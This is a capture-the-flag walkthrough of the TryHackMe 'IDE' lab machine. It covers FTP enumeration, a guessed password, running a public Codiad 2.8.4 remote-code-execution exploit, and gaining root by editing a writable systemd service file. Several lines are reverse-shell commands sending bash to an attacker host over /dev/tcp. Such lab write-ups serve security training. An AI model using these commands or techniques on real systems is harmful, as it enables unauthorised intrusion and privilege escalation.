# THM: IDE

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/ide/ide.png" alt="IDE" width="90"/> |
| Room | IDE |
| URL | https://tryhackme.com/room/ide |
| Difficulty | Easy |

## Concepts/Tools Used

- [ftp](/tools/ftp.md)
- [searchsploit](/tools/searchsploit.md)

## Room Description

An easy box to polish your enumeration skills!

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-10 07:44 BST
Nmap scan report for target.thm (10.10.43.79)
Host is up (0.00011s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.162.238
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Codiad 2.8.4
MAC Address: 02:87:19:47:CF:33 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
```

The ssh service on port 22 allows password log in attempts.

I see that the ftp user can log into the ftp service. I run the following:

```bash
$ ftp target.thm
Connected to target.thm.
220 (vsFTPd 3.0.3)
Name (target.thm:root): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> get - -
remote: -
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for - (151 bytes).
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.

226 Transfer complete.
151 bytes received in 0.00 secs (238.6099 kB/s)
```

It looks like drac and john are possible usernames. The drac user has reset john's password to "the default password". The file also hits about an image having extra information.

I checked the site at http://target.thm and it looks like the typical Apache default page.

## Getting a Foothold

I checked the site at http://target.thm:62337 and I found a login form. The title for this page says Codiad 2.8.4. I have a couple usernames that I can try but I don't have a password. With that in mind, I check searchsploit:

```bash
$ searchsploit codiad 2.8.4
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Codiad 2.8.4 - Remote Code Execution (Authenticated)                            | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                        | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                        | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                        | multiple/webapps/50474.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Remote code execution is good but I need a password for these to work. I remembered the note that was on the ftp server and I decided to manually try a few common passwords with the usernames mentioned. The following combination worked:

john:password

Now that I have a username and password, I can use one of the scripts provided by searchsploit:

```bash
$ searchsploit -m 49705
  Exploit: Codiad 2.8.4 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49705
     Path: /opt/exploitdb/exploits/multiple/webapps/49705.py
    Codes: CVE-2018-14009
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/49705.py
```

I inspected the script and ran it with the following command:

```bash
$ python3 49705.py http://target.thm:62337/ john password 10.10.170.229 4444 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/<attack_box_ip>/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
```

The above command wanted me to open two new terminals and run the two commands mentioned. Once I confirmed that I had ran the commands, the terminal that was listening on port 4445 has the reverse shell.

I have a shell. I'm in!

## user.txt

Now that I have a shell, I [stablize the shell](/README.md#stable-shell) and check the home directory for a user.txt file:

```bash
$ ls /home
drac
$ cd /home/drac
$ cat user.txt
cat: user.txt: Permission denied
```

The user.txt is read only by drac:

```bash
$ ls -lh
total 52K
drwxr-xr-x 6 drac drac 4.0K Aug  4  2021 .
drwxr-xr-x 3 root root 4.0K Jun 17  2021 ..
-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 drac drac 3.7K Jul 11  2021 .bashrc
drwx------ 4 drac drac 4.0K Jun 18  2021 .cache
drwxr-x--- 3 drac drac 4.0K Jun 18  2021 .config
drwx------ 4 drac drac 4.0K Jun 18  2021 .gnupg
drwx------ 3 drac drac 4.0K Jun 18  2021 .local
-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful
-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
```

I start checking the files in this directory that I have read permissions. The .bash_history file has what I need:

```bash
$ cat .bash_history
mysql -u drac -p 'REDACTED'
```

With that password I run the following:

```bash
$ su drac
$ cat user.txt
REDACTED
```

## root.txt

Now that I have a new user I ran my [usual list of commands](/concepts/privilege_escalation.md#linux-privilege-escalation). The id command and the sudo -l command provided interesting results:

```bash
$ id
uid=1000(drac) gid=1000(drac) groups=1000(drac),24(cdrom),27(sudo),30(dip),46(plugdev)
$ sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

I did a google search for "privilege escalation /usr/sbin/service". I found an [interesting article](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation) that explains what I am about to do.

The service command uses a configuration file to start, restart or stop a service. That configuration file has a property called ExecStartPre that specifies a command that can be ran before a service is started or restarted. Since I am going to run the service command using sudo, the ExecStartPre command will also be ran as root.

I do a search for the vsftpd service configuration file:

```bash
$ find / -name "*vsftpd*" 2>/dev/null
/lib/systemd/system/vsftpd.service
/etc/systemd/system/multi-user.target.wants/vsftpd.service
$ ls -lha /lib/systemd/system/vsftpd.service
-rw-rw-r-- 1 root drac 270 Jul  4 15:34 /lib/systemd/system/vsftpd.service
$ ls -lha /etc/systemd/system/multi-user.target.wants/vsftpd.service
lrwxrwxrwx 1 root root 34 Jun 18  2021 /etc/systemd/system/multi-user.target.wants/vsftpd.service -> /lib/systemd/system/vsftpd.service
```

Since the file in the /etc directory is a symlink to the one in /lib, I will edit the one in /lib. I backup the file before I make any changes:

```bash
$ cp /lib/systemd/system/vsftpd.service /tmp/backup.bak
```

The file was the following before any changes:
```bash
$ cat /lib/systemd/system/vsftpd.service
cat /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

The line that needs to change is `ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty`.

I change that line to `ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/<attack_machine_ip>/4446 0>&1'`.

I start a netcat listener on the attack machine:

```bash
$ nc -lnvp 4446
```

Since the configuration file was changed, the systemd state needs to be reloaded:

```bash
$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
$ sudo /usr/sbin/service vsftpd restart
```

I check the listener on the attack machine.

It worked. I'm in! The cursor changed to the # character to let me know that I am root. I ran the following to get the flag:

```bash
# cat /root/root.txt
REDACTED
```
